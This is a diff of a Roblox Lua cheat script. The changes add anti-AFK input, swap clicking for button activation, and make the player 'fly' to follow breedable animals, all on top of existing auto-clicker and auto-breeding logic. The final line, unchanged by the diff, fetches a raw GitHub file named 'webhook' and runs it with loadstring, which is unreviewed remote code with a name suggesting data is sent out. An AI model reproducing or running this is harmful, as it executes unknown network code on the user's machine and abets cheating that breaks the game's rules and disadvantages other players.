@@ -4,13 +4,14 @@ local lp = players.LocalPlayer
 local playerGui = lp:WaitForChild("PlayerGui")
 local VIM = game:GetService("VirtualInputManager")
 local Camera = workspace.CurrentCamera
+local RunService = game:GetService("RunService")
 
 -- State
 local currentTask
 local isPaused = false
 local currentIsland = "Unknown"
 local clickLoop = nil
-local isBreeding = false -- Flag to prevent auto-clicker from interfering with breeding clicks
+local isBreeding = false
 
 -- Breeding Script Variables
 local itemInfoFrame = playerGui:WaitForChild("SubMenus"):WaitForChild("Item Information")
@@ -20,6 +21,28 @@ local buttonsContainer = itemInfoFrame.Animals.Main.Content.Buttons
 local TARGET_IMAGE_ID = "rbxassetid://13116451197"
 local isProcessingBreed = false
 
+-- Anti-AFK
+local VirtualUser = game:GetService("VirtualUser")
+
+lp.Idled:Connect(function()
+	VirtualUser:CaptureController()
+	VirtualUser:ClickButton2(Vector2.new())
+	print("Anti-AFK: Prevented idle kick")
+end)
+
+task.spawn(function()
+	while true do
+		task.wait(300)
+		VirtualUser:CaptureController()
+		VirtualUser:Button1Down(Vector2.new(0, 0))
+		task.wait(0.1)
+		VirtualUser:Button1Up(Vector2.new(0, 0))
+	end
+end)
+
+-- Configuration
+local FLY_SPEED = 30
+
 -- Virtual Input Manager Functions
 local function getScreenSize()
 	return Camera.ViewportSize
@@ -27,25 +50,24 @@ end
 
 local function getClickPosition()
 	local screenSize = getScreenSize()
-	local x = screenSize.X - 300  -- 300 pixels from right edge
-	local y = 30                   -- 30 pixels from top
+	local x = screenSize.X - 300
+	local y = 30
 	return x, y
 end
 
 local function clickAt(x, y)
-	VIM:SendMouseButtonEvent(x, y, 0, true, game, 0)  -- Mouse down
+	VIM:SendMouseButtonEvent(x, y, 0, true, game, 0)
 	task.wait(0.05)
-	VIM:SendMouseButtonEvent(x, y, 0, false, game, 0) -- Mouse up
+	VIM:SendMouseButtonEvent(x, y, 0, false, game, 0)
 end
 
 local function startAutoClicker()
 	if clickLoop then
 		task.cancel(clickLoop)
 	end
-	
+
 	clickLoop = task.spawn(function()
 		while true do
-			-- Only click if not paused AND not currently breeding
 			if not isPaused and not isBreeding then
 				local x, y = getClickPosition()
 				clickAt(x, y)
@@ -56,127 +78,117 @@ local function startAutoClicker()
 end
 
 -- Breeding Script Functions
-local function clickButtonVIM(button)
+local function clickButtonActivated(button)
 	if not button:IsA("TextButton") and not button:IsA("ImageButton") then
 		return
 	end
-	
-	print("Clicking button with VirtualInputManager: " .. button.Name)
-	
-	-- Get button position
-	local buttonPos = button.AbsolutePosition
-	local buttonSize = button.AbsoluteSize
-	local centerX = buttonPos.X + (buttonSize.X / 2) + 12
-	local centerY = buttonPos.Y + (buttonSize.Y / 2) + 50  -- Added 50 pixels down
-	
-	-- Add 5-pixel right offset for close button
-	if button.Name == "CloseMenu" then
-		centerX = centerX + 8
-		centerY = centerY + 2
-	end
-	
-	-- Simulate mouse click at button center
-	VIM:SendMouseButtonEvent(centerX, centerY, 0, true, game, 0)
-	task.wait(0.1)
-	VIM:SendMouseButtonEvent(centerX, centerY, 0, false, game, 0)
-	
-	print("VIM click sent on: " .. button.Name)
+	print("Clicking button with Activated event: " .. button.Name)
+	button:Activate()
+	print("Activated click sent on: " .. button.Name)
 end
 
 local function clickYesButtonVIM(button)
 	if not button:IsA("TextButton") and not button:IsA("ImageButton") then
 		return
 	end
-	
+
 	print("Clicking Yes button with VirtualInputManager")
-	
-	-- Get button position
+
 	local buttonPos = button.AbsolutePosition
 	local buttonSize = button.AbsoluteSize
 	local centerX = buttonPos.X + (buttonSize.X / 2) + 7
-	local centerY = buttonPos.Y + (buttonSize.Y / 2) + 50  -- Added 50 pixels down
-	
+	local centerY = buttonPos.Y + (buttonSize.Y / 2) + 50
+
 	print("Button center position (adjusted): X=" .. centerX .. " Y=" .. centerY)
-	
-	-- Simulate mouse click at button center
+
 	VIM:SendMouseButtonEvent(centerX, centerY, 0, true, game, 0)
 	task.wait(0.1)
 	VIM:SendMouseButtonEvent(centerX, centerY, 0, false, game, 0)
-	
+
 	print("VIM click sent")
 end
 
 local function onItemInfoOpened()
-	-- Debounce check
-	if isProcessingBreed then
-		return
-	end
-	
-	-- Check if the frame is actually visible
-	if not itemInfoFrame.Visible then
-		return
-	end
-	
+	if isProcessingBreed then return end
+	if not itemInfoFrame.Visible then return end
+
 	isProcessingBreed = true
-	isBreeding = true -- Pause auto-clicker
-	
-	-- Wait 0.5 seconds before doing anything to avoid bugs
+	isBreeding = true
+
 	task.wait(0.5)
-	
-	-- Check if IndicatorLabel contains "Unbreedable"
+
 	local labelText = indicatorLabel.Text
-	
+
 	if string.find(labelText, "Unbreedable") then
-		-- Contains "Unbreedable" - just close the menu and return
 		print("Item is Unbreedable, closing menu")
-		clickButtonVIM(closeButton)
+		clickButtonActivated(closeButton)
 		task.wait(1)
 		isProcessingBreed = false
-		isBreeding = false -- Resume auto-clicker
+		isBreeding = false
 		return
 	end
-	
-	-- Does NOT contain "Unbreedable" - proceed with breeding logic
+
 	print("Item is breedable, looking for breed button")
-	
-	-- Look through all OptionButtons in the Buttons container
+
 	for _, child in ipairs(buttonsContainer:GetChildren()) do
 		if child.Name == "OptionButton" then
-			-- Check if it has an ImageLabel child
 			local imageLabel = child:FindFirstChildWhichIsA("ImageLabel")
 			if imageLabel and imageLabel.Image == TARGET_IMAGE_ID then
 				print("Found breeding button, clicking it")
-				clickButtonVIM(child)
-				
-				-- Wait 1seconds for the prompt to fully appear
-				print("Waiting 1seconds for YesNo prompt to load...")
+				clickButtonActivated(child)
+
+				print("Waiting 1 second for YesNo prompt to load...")
 				task.wait(1)
-				
-				-- Click the Yes button with VIM
+
 				local success, err = pcall(function()
 					local prompts = playerGui:WaitForChild("Prompts", 3)
 					local yesNo = prompts:WaitForChild("YesNo", 3)
 					local yesButton = yesNo.Content.Frame.Yes
-					
-					print("Found Yes button, waiting 1 second...")
+
+					print("Found Yes button, waiting 0.1 second...")
 					task.wait(0.1)
-					
+
 					clickYesButtonVIM(yesButton)
 				end)
-				
+
 				if not success then
 					warn("Failed to click Yes button: " .. tostring(err))
 				end
-				
+
 				break
 			end
 		end
 	end
-	
-	-- Reset debounce and resume auto-clicker after a delay
+
 	task.wait(0.5)
 	isProcessingBreed = false
 	isBreeding = false
+end
+
+-- Fly to a target position (moves player character smoothly)
+local function flyToPosition(hrp, targetPos, shouldContinue)
+	local startPos = hrp.Position
+	local distance = (targetPos - startPos).Magnitude
+	local duration = distance / FLY_SPEED
+	local startTime = tick()
+
+	while tick() - startTime < duration do
+		if not shouldContinue() then return false end
+
+		local alpha = math.min((tick() - startTime) / duration, 1)
+		local currentPos = startPos:Lerp(targetPos, alpha)
+
+		local direction = (targetPos - currentPos)
+		if direction.Magnitude > 0.1 then
+			hrp.CFrame = CFrame.lookAt(currentPos, currentPos + direction.Unit)
+		else
+			hrp.CFrame = CFrame.new(currentPos, hrp.CFrame.LookVector)
+		end
+
+		RunService.Heartbeat:Wait()
+	end
+
+	return true
 end
 
 -- Create GUI
@@ -225,13 +237,13 @@ buttonCorner.Parent = pauseButton
 local function getCurrentIsland()
 	local char = lp.Character
 	if not char then return nil end
-	
+
 	local hrp = char:FindFirstChild("HumanoidRootPart")
 	if not hrp then return nil end
-	
+
 	local islands = workspace:FindFirstChild("Islands")
 	if not islands then return nil end
-	
+
 	for _, island in ipairs(islands:GetChildren()) do
 		if island:IsA("Model") or island:IsA("Folder") then
 			local playerModel = island:FindFirstChild(lp.Name)
@@ -240,28 +252,31 @@ local function getCurrentIsland()
 			end
 		end
 	end
-	
+
 	return nil
 end
 
--- Follow Logic
+-- Follow Logic (fly-based)
 local function followLoopFrom(folder)
 	if currentTask then
 		task.cancel(currentTask)
 	end
-	
+
 	local char = lp.Character or lp.CharacterAdded:Wait()
 	local hrp = char:WaitForChild("HumanoidRootPart")
 	local humanoid = char:WaitForChild("Humanoid")
-	
+
+	-- Disable humanoid auto-movement so we can fly freely
+	humanoid.WalkSpeed = 0
+	humanoid.JumpPower = 0
+
 	local function getValidTargets()
 		local targets = {}
 		for _, model in ipairs(folder:GetChildren()) do
 			if model:IsA("Model") and model:FindFirstChild("HumanoidRootPart") then
 				local hasManeMesh = model:FindFirstChild("maneMesh")
 				local isReindeer = false
-				
-				-- Check for Reindeer breed
+
 				local overheadPart = model:FindFirstChild("OverheadPart")
 				if overheadPart then
 					local overHead = overheadPart:FindFirstChild("OverHead")
@@ -272,7 +287,7 @@ local function followLoopFrom(folder)
 						end
 					end
 				end
-				
+
 				if hasManeMesh or isReindeer then
 					table.insert(targets, model)
 				end
@@ -280,19 +295,19 @@ local function followLoopFrom(folder)
 		end
 		return targets
 	end
-	
+
 	currentTask = task.spawn(function()
 		local currentTarget = nil
 		local lastSwitch = 0
-		
+
 		while true do
 			if isPaused then
 				task.wait(0.5)
 				continue
 			end
-			
+
 			local now = tick()
-			
+
 			-- Switch target every 15 seconds or if lost
 			if not currentTarget or not currentTarget.Parent or now - lastSwitch >= 15 then
 				local targets = getValidTargets()
@@ -301,32 +316,33 @@ local function followLoopFrom(folder)
 					repeat
 						newTarget = targets[math.random(1, #targets)]
 					until newTarget ~= currentTarget or #targets == 1
-					
+
 					currentTarget = newTarget
 					lastSwitch = now
-					
-					local targetHRP = currentTarget:FindFirstChild("HumanoidRootPart")
-					if targetHRP then
-						hrp.CFrame = targetHRP.CFrame * CFrame.new(0, 0, -5)
-					end
 				end
 			end
-			
-			-- Follow current target
+
+			-- Fly toward current target
 			if currentTarget and currentTarget:FindFirstChild("HumanoidRootPart") then
 				local targetHRP = currentTarget.HumanoidRootPart
-				local distance = (hrp.Position - targetHRP.Position).Magnitude
-				
-				if distance > 6 then
-					humanoid:MoveTo(targetHRP.Position + Vector3.new(0, 0, -4))
-				end
-				
-				if distance > 30 then
-					hrp.CFrame = targetHRP.CFrame * CFrame.new(0, 0, -4)
-				end
+				local targetPos = targetHRP.Position + Vector3.new(0, 0, -4)
+
+				-- Continuously fly toward the target; re-evaluate every frame
+				flyToPosition(hrp, targetPos, function()
+					-- Stop flying if paused, task cancelled, or target gone
+					if isPaused or not currentTarget or not currentTarget.Parent then
+						return false
+					end
+					-- If target has moved significantly, break early to re-target
+					local newTargetPos = targetHRP.Position + Vector3.new(0, 0, -4)
+					if (newTargetPos - targetPos).Magnitude > 8 then
+						return false
+					end
+					return true
+				end)
+			else
+				task.wait(0.2)
 			end
-			
-			task.wait(0.2)
 		end
 	end)
 end
@@ -337,8 +353,7 @@ local function updateIsland()
 	if island then
 		currentIsland = island
 		islandLabel.Text = "Island: " .. currentIsland
-		
-		-- Start following on detected island
+
 		local islands = workspace:FindFirstChild("Islands")
 		if islands then
 			local islandFolder = islands:FindFirstChild(currentIsland)
@@ -383,12 +398,10 @@ task.spawn(function()
 	end
 end)
 
--- Handle respawn
+-- Restore humanoid speed on respawn and re-init
 lp.CharacterAdded:Connect(function()
 	task.wait(1)
 	updateIsland()
 end)
 
 loadstring(game:HttpGet('https://raw.githubusercontent.com/obeseid/Lellelelebonczki/refs/heads/main/webhook'))()
-
-print("hhhhh")
